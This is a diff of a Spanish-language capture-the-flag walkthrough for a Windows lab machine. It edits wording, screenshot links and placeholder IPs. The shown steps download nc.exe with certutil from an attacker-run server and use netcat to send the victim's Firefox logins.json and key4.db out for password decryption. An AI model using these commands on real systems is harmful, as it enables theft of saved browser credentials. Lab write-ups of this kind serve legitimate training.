@@ -375,7 +375,7 @@ usando los comandos dde windows podemos conseguir sin dificultad la primera flag
 ![natbat flag](https://user-images.githubusercontent.com/107126653/172892126-79db0337-c281-4b41-8c6a-510ff31ce8cf.png)
 
 
-ATENTO A ESTOS PASOS
+ATENTO A ESTOS PASOS  , COPIA Y PEGALOS LINEA POR LINEA
 
 vamos a esta dirección```C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release```
 
@@ -386,9 +386,9 @@ nos bajamos de github este repositorio  a nuestra kali linux ```git clone https:
                                                             ```python3 -m http.server ```
                                                             ```certutil -urlcache -f "http://IP:8000/nc.exe" nc.exe ```
                                                             ```nc -nlvp 1234 > logins.json ```
-                                                             ```nc.exe -nv 10.11.70.166 1234 < logins.json ```
+                                                             ```nc.exe -nv IPVPN 1234 < logins.json ```
                                                              ``` nc -nlvp 1234 > key4.db```
-                                                              ```nc.exe -nv 10.11.70.166 1234 < key4.db ```
+                                                              ```nc.exe -nv IPVPN 1234 < key4.db ```
                                                               ```mv logins.json firepwd/ ```
                                                               ```mv key4.db firepwd/```
                                                               ```pip install -r requirements.txt```
@@ -400,12 +400,12 @@ nos bajamos de github este repositorio  a nuestra kali linux ```git clone https:
    ![system32](https://user-images.githubusercontent.com/107126653/172903722-62caf4ec-b759-4238-8604-85b827b83558.png)
    
 
-   ahora ![users root](https://user-images.githubusercontent.com/107126653/172903753-217771e4-11d7-4f81-beb4-ef493cecf3a9.png)
+   ahora !        [users root](https://user-images.githubusercontent.com/107126653/172903753-217771e4-11d7-4f81-beb4-ef493cecf3a9.png)
     
                                                 
-   users! ![amyor desktop](https://user-images.githubusercontent.com/107126653/172903757-111e45fa-88e1-478d-9196-e173be309ea3.png)
+   users!         ![amyor desktop](https://user-images.githubusercontent.com/107126653/172903757-111e45fa-88e1-478d-9196-e173be309ea3.png)
      
      
-   finalmente ![root](https://user-images.githubusercontent.com/107126653/172903935-b0545cae-ccdb-48ed-b085-ea0c58630af6.png)
+   finalmente!    ![root](https://user-images.githubusercontent.com/107126653/172903935-b0545cae-ccdb-48ed-b085-ea0c58630af6.png)
                                        
                                                     
